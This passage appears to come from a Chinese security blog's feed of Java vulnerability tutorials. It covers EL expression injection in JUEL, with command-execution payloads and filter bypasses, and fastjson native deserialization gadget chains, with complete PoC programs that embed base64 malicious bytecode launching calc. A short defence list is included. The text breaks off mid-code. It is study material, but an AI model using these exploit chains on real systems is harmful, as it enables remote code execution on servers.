class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>org.apache.jasper.runtime.PageContextImpl#proprietaryEvaluate方法内会通过ExpressionFactoryImpl#createValueExpression返回ValueExpression对象，它根据EL表达式的<code>.</code>和<code>()</code>，进行分隔</p><p><img src="/archives/bc5d7b36/image-20251012190717204.png" alt="image-20251012190717204"></p><p>随后调用AsValue#getValue方法循环反射，最后javax.el.BeanELResolver#invoke方法反射执行我们的方法</p><h2 id="EL表达式注入"><a href="#EL表达式注入" class="headerlink" title="EL表达式注入"></a>EL表达式注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>EL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。</p><p>一般的，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分从外部获取的</p><h3 id="JUEL"><a href="#JUEL" class="headerlink" title="JUEL"></a>JUEL</h3><p>JUEL是统一表达式语言EL(Unified Expression Language)的实现，是JSP 2.1标准(JSR-245)的一部分，已在JEE5<br>中引入。它具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。</p><p>相关依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;juel-spi&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;<span class="number">2.2</span><span class="number">.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;juel-api&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;<span class="number">2.2</span><span class="number">.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;juel-impl&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;<span class="number">2.2</span><span class="number">.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>注入漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExpressionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressionFactoryImpl</span>();  <span class="comment">//创建表达式工厂</span></span><br><span class="line"><span class="type">SimpleContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleContext</span>(); <span class="comment">//创建EL上下文</span></span><br><span class="line"><span class="type">ValueExpression</span> <span class="variable">e</span> <span class="operator">=</span> factory.createValueExpression(context,str, String.class);  <span class="comment">//创建值表达式</span></span><br><span class="line"><span class="keyword">return</span> e.getValue(context).toString();  <span class="comment">//执行并返回结果</span></span><br></pre></td></tr></table></figure><p>其中str为我们的恶意EL表达式，这串代码意思是将字符串当作代码来执行</p><h3 id="常见poc"><a href="#常见poc" class="headerlink" title="常见poc"></a>常见poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span></span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Web路径</span></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件头参数</span></span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取webRoot</span></span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行命令</span></span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&quot;a&quot;</span>,pageContext.request.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc&quot;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="利用ScriptEngine调用JS引擎绕过"><a href="#利用ScriptEngine调用JS引擎绕过" class="headerlink" title="利用ScriptEngine调用JS引擎绕过"></a>利用ScriptEngine调用JS引擎绕过</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByMimeType(<span class="string">&quot;text/javascript&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>)&#125;</span><br><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h4 id="利用反射绕过"><a href="#利用反射绕过" class="headerlink" title="利用反射绕过"></a>利用反射绕过</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;calc&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h4 id="charAt-toChars获取字符"><a href="#charAt-toChars获取字符" class="headerlink" title="charAt&#x2F;toChars获取字符"></a>charAt&#x2F;toChars获取字符</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="literal">true</span>.toString().charAt(<span class="number">0</span>).toChars(<span class="number">99</span>)[<span class="number">0</span>].toString()&#125;<span class="comment">//c</span></span><br></pre></td></tr></table></figure><blockquote><p>true.toString().charAt(0)返回字符t,ASCII码116</p><p><code>.toChars(99)[0]</code>将Unicode码点99转换为字符，而ASCII码为99的是字符c，所以这里得到的值与前面t无关，这只是 <code>Character</code> 类上的静态调用，由于返回的是数组，所以要加上<code>[0]</code></p></blockquote><p>这可以当作构造特殊字符的绕过</p><h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul><li><p>尽量不使用外部输入的内容作为EL表达式内容；</p></li><li><p>若使用，则严格过滤EL表达式注入漏洞的payload关键字；</p></li><li><p>如果是排查Java程序中JUEL相关代码，则搜索如下关键类方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.el.ExpressionFactory.createValueExpression()</span><br><span class="line">javax.el.ValueExpression.getValue()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> 表达式注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EL表达式注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson原生反序列化漏洞</title>
      <link href="/archives/853cfc82/"/>
      <url>/archives/853cfc82/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前面fastjson利用中，我们是通过利用@type获取我们的恶意对象，然后通过调用其构造方法、setter和getter方法来造成漏洞。而在fastjson依赖包中，同样也存在着和CC链一样的利用方式，通过从readObject出发的原生链。</p><p>在fastjson中可以序列化的类有：</p><ul><li>com.alibaba.fastjson.JSONArray</li><li>com.alibaba.fastjson.JSONObject</li><li>com.alibaba.fastjson.JSONException</li><li>com.alibaba.fastjson.JSONPathException</li></ul><p><img src="/archives/853cfc82/image-20251003185236767.png" alt="image-20251003185236767"></p><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.48&amp;2"></a>fastjson&lt;&#x3D;1.2.48&amp;2</h2><p>版本限制：fastjson1小于等于1.2.48版本、fastjson2 2.0.26版本以下通杀，从2.0.27开始被修复。</p><h3 id="JSONObject链"><a href="#JSONObject链" class="headerlink" title="JSONObject链"></a>JSONObject链</h3><p>主要利用点在于JSON.toString方法：</p><p><img src="/archives/853cfc82/image-20251003193623002.png" alt="image-20251003193623002"></p><p>它会调用toJSONString方法：</p><p><img src="/archives/853cfc82/image-20251003193704308.png" alt="image-20251003193704308"></p><p>其中JSONSerializer(out).write就是进行序列化并且调用对象getter方法的地方：<br><img src="/archives/853cfc82/image-20251003193808150.png" alt="image-20251003193808150"></p><p>先获取对象类型及序列化器，然后调用write方法进行序列化并调用类的getter方法</p><p>所以我们的思路就是在反序列化时通过调用JSON#toString方法触发恶意类如TemplatesImpl的getter方法来加载恶意字节码</p><p>如何能够调用JSON#toString方法呢？这里我们很容易想到CC5链，在CC5中我们通过BadAttributeValueExpException#readObject调用TiedMapEntry.toString()方法，这里我们只用改成调用JSONObject.toString即可：<br><img src="/archives/853cfc82/image-20251003210457813.png" alt="image-20251003210457813"></p><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] codes= Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;codes&#125;);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;b1uel0n3&quot;</span>,templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ob</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/853cfc82/image-20251003210811776.png" alt="image-20251003210811776"></p><p>跟进源码分析：<br><img src="/archives/853cfc82/image-20251003210913689.png" alt="image-20251003210913689"></p><p>此时获得的序列化器是MapSerializer，调用MapSerializer.write方法：<br><img src="/archives/853cfc82/image-20251003211827651.png" alt="image-20251003211827651"></p><p>其中会遍历Map中的每个键值对，随后会对键值对进行过滤和转换，会将键统一转换成字符串类型好进行后续序列化操作</p><p><img src="/archives/853cfc82/image-20251003213004173.png" alt="image-20251003213004173"></p><p>这里获取键值的类型及序列化器ASMSerializer_1_TemplatesImpl</p><p><img src="/archives/853cfc82/image-20251003213224766.png" alt="image-20251003213224766"></p><p>随后调用ASMSerializer_1_TemplatesImpl.write方法进行序列化，里面就会调用TemplatesImpl属性的getter方法getOutputProperties()方法弹计算机</p><p>利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject()</span><br><span class="line">BadAttributeValueExpException -&gt; readObject()</span><br><span class="line">JSONObject -&gt; toString()</span><br><span class="line">JSON -&gt; toString()</span><br><span class="line">JSON -&gt; toJSONString()</span><br><span class="line">MapSerializer -&gt; write()</span><br><span class="line">ASMSerializer_1_TemplatesImpl -&gt; write()</span><br><span class="line">TemplatesImpl -&gt; getOutputProperties()</span><br></pre></td></tr></table></figure><h3 id="JSONArray链"><a href="#JSONArray链" class="headerlink" title="JSONArray链"></a>JSONArray链</h3><p>JSONArray链原理是一样的，他和JSONObject都是继承于JSON类：<br><img src="/archives/853cfc82/image-20251003214051147.png" alt="image-20251003214051147"></p><p>所以原理上同样是调用JSON.toString方法触发，这里是通过add方法添加：</p><p><img src="/archives/853cfc82/image-20251003214320076.png" alt="image-20251003214320076"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">jsonArray.add(templates);</span><br></pre></td></tr></table></figure><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] codes= Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;codes&#125;);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ob</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object 